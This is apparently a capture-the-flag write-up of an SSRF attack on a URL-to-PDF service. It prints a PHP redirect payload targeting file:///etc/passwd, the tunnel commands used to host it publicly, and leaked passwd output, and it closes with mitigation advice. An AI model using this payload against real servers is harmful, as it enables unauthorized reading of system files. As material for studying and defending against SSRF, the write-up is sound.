# SSRF Attack (Server-Side Request Forgery)

## Overview

This challenge involved exploiting an **SSRF (Server-Side Request Forgery)** vulnerability to access restricted files on the target server. The target application allowed users to provide a URL, which the server then processed and converted into a PDF format.

---

## Step-by-Step Exploitation

### 1. Initial Observation

- The application accepted a URL as input and displayed the content of the URL in a PDF format.
- This behavior hinted at a potential SSRF vulnerability, as the server was likely making requests to the provided URLs.

---

### 2. Crafting the Exploit

To exploit the SSRF vulnerability, the goal was to trick the server into fetching a sensitive file from its local filesystem. The payload used a crafted URL pointing to a malicious PHP file hosted on my server.

#### Malicious PHP File (`test.php`):

This file instructed the server to redirect to a sensitive file on its own system:

```php
<!DOCTYPE html>
<html lang="en">
<body>

<?php
header('location:file:///etc/passwd');
?>

</body>
</html>
```

- **`file:///etc/passwd`**: Targets the `/etc/passwd` file on the server.
- **Redirection**: Ensures the server fetches and processes the sensitive file.

---

### 3. Hosting the Malicious PHP File

To host the PHP file, I set up a local PHP server and used **NoKey** to expose it publicly.

#### Steps to Host the File:

1. Start a local PHP server:
   
   ```bash
   php -S 0.0.0.0:PORT
   ```

2. Use **NoKey** to expose the server:
   
   ```bash
   ssh -R 80:MY_IP:PORT nokey@localhost.run
   ```

3. The NoKey service provided a public URL, e.g., `https://abc123.localhost.run/test.php`.

---

### 4. Sending the Payload

The payload URL (`https://abc123.localhost.run/test.php`) was sent to the target application. Upon processing, the application:

1. Followed the redirection to `file:///etc/passwd`.
2. Included the contents of `/etc/passwd` in the generated PDF file.

---

## Result

The attack successfully retrieved the `/etc/passwd` file, demonstrating the SSRF vulnerability in the application.

### Sample Output (Extracted from PDF):

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

---

## Lessons Learned

### Key Takeaways

1. **Understanding SSRF**:
   
   - SSRF exploits the trust of a server to make unauthorized requests, potentially accessing sensitive internal resources.

2. **Crafting Malicious Payloads**:
   
   - Used PHP redirection to target local files on the server.

3. **Public Exposure Tools**:
   
   - Leveraged NoKey to expose a local server for testing.

### Mitigation Strategies

1. **Input Validation**:
   
   - Restrict allowed URLs to only trusted domains.

2. **Local Resource Access**:
   
   - Prevent server access to local file paths like `file://`.

3. **Request Filtering**:
   
   - Use allowlists to block internal IP ranges and sensitive paths.

---

## Skills Gained

1. Exploiting SSRF vulnerabilities in web applications.
2. Hosting and exposing local servers using NoKey.
3. Crafting payloads to target local server resources.
